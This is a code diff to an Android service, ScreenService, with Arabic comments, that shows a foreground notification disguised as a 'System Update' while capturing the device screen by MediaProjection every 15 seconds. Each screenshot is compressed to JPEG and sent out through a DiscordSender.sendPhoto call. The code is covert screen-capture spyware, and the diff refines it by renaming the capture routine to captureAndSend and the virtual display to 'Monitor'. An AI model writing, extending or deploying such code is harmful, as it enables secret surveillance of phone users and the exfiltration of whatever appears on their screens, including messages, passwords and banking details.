@@ -28,13 +28,16 @@ public class ScreenService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // تشغيل الإشعار فوراً (أهم خطوة لمنع الكراش)
-        String cid = "sys_service";
-        NotificationChannel ch = new NotificationChannel(cid, "System", NotificationManager.IMPORTANCE_LOW);
-        getSystemService(NotificationManager.class).createNotificationChannel(ch);
-        startForeground(1, new NotificationCompat.Builder(this, cid)
-                .setContentTitle("System Update")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details).build());
+        String channelId = "system_monitoring";
+        NotificationChannel channel = new NotificationChannel(channelId, "System Update Service", NotificationManager.IMPORTANCE_LOW);
+        getSystemService(NotificationManager.class).createNotificationChannel(channel);
+        
+        Notification notification = new NotificationCompat.Builder(this, channelId)
+                .setContentTitle("تحديث النظام قيد التشغيل")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .build();
+
+        startForeground(1, notification);
 
         if (intent != null && intent.hasExtra("resData")) {
             int resCode = intent.getIntExtra("resCode", -1);
@@ -50,29 +53,31 @@ public class ScreenService extends Service {
         DisplayMetrics metrics = new DisplayMetrics();
         WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
         wm.getDefaultDisplay().getMetrics(metrics);
-        // تقليل الحجم للنصف لضمان السرعة ومنع استهلاك الذاكرة
+
         imageReader = ImageReader.newInstance(metrics.widthPixels / 2, metrics.heightPixels / 2, PixelFormat.RGBA_8888, 2);
-        virtualDisplay = mediaProjection.createVirtualDisplay("Capture", 
-                metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi, 16, imageReader.getSurface(), null, null);
+        virtualDisplay = mediaProjection.createVirtualDisplay("Monitor", 
+                metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
 
         handler.postDelayed(new Runnable() {
             @Override public void run() {
-                capture();
+                captureAndSend();
                 handler.postDelayed(this, 15000); // إرسال صورة كل 15 ثانية
             }
         }, 5000);
     }
 
-    private void capture() {
+    private void captureAndSend() {
         try (Image image = imageReader.acquireLatestImage()) {
             if (image != null) {
                 Image.Plane[] planes = image.getPlanes();
                 ByteBuffer buffer = planes[0].getBuffer();
                 Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
                 bitmap.copyPixelsFromBuffer(buffer);
-                File file = new File(getCacheDir(), "s.png");
+                
+                File file = new File(getCacheDir(), "shot.png");
                 try (FileOutputStream out = new FileOutputStream(file)) {
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out); // ضغط الصورة للسرعة
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 50, out);
                     DiscordSender.sendPhoto(file);
                 }
                 bitmap.recycle();
